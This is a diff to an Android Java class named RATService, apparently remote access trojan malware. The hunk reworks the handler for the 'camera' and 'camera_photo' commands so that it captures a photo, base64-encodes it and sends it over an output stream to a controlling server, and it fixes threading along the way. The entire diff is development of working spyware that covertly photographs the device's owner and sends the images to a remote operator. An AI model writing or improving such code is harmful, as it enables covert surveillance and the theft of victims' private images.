@@ -557,46 +557,51 @@ public class RATService extends Service {
                 break;
                 
             // CAMERA COMMANDS - FIXED: Removed duplicate case
-    case "camera":
+ // CAMERA COMMANDS - FIXED
+case "camera":
 case "camera_photo":
     if (cameraModule != null) {
         Log.d(TAG, "📸 Taking photo with camera module");
         
-        cameraModule.takePhoto(new Camera2Module.CameraCallback() {  // Changed from CameraModule.CameraCallback
-            @Override
-            public void onPhotoTaken(String base64Image) {
-                Log.d(TAG, "📸 Photo taken successfully, sending response");
-                
-                // Use executor to send response (not on main thread)
-                executor.execute(() -> {
-                    try {
-                        if (out != null) {
-                            out.println(base64Image);
-                            out.flush();
-                            Log.d(TAG, "📸 Camera response sent to server");
+        // Use a handler to ensure we're on the right thread
+        new Handler(Looper.getMainLooper()).post(() -> {
+            cameraModule.takePhoto(new Camera2Module.CameraCallback() {
+                @Override
+                public void onPhotoTaken(String base64Image) {
+                    Log.d(TAG, "📸 Photo taken successfully, sending response");
+                    
+                    // Send response in a separate thread to avoid blocking
+                    new Thread(() -> {
+                        try {
+                            if (out != null) {
+                                out.println(base64Image);
+                                out.flush();
+                                Log.d(TAG, "📸 Camera response sent to server");
+                            } else {
+                                Log.e(TAG, "📸 Output stream is null");
+                            }
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error sending camera response", e);
                         }
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error sending camera response", e);
-                    }
-                });
-            }
-            
-            @Override
-            public void onError(String error) {
-                Log.e(TAG, "📸 Camera error: " + error);
+                    }).start();
+                }
                 
-                // Use executor to send error (not on main thread)
-                executor.execute(() -> {
-                    try {
-                        if (out != null) {
-                            out.println(error);
-                            out.flush();
+                @Override
+                public void onError(String error) {
+                    Log.e(TAG, "📸 Camera error: " + error);
+                    
+                    new Thread(() -> {
+                        try {
+                            if (out != null) {
+                                out.println("CAMERA|ERROR: " + error);
+                                out.flush();
+                            }
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error sending error", e);
                         }
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error sending error", e);
-                    }
-                });
-            }
+                    }).start();
+                }
+            });
         });
     } else {
         Log.e(TAG, "📸 Camera module is null");
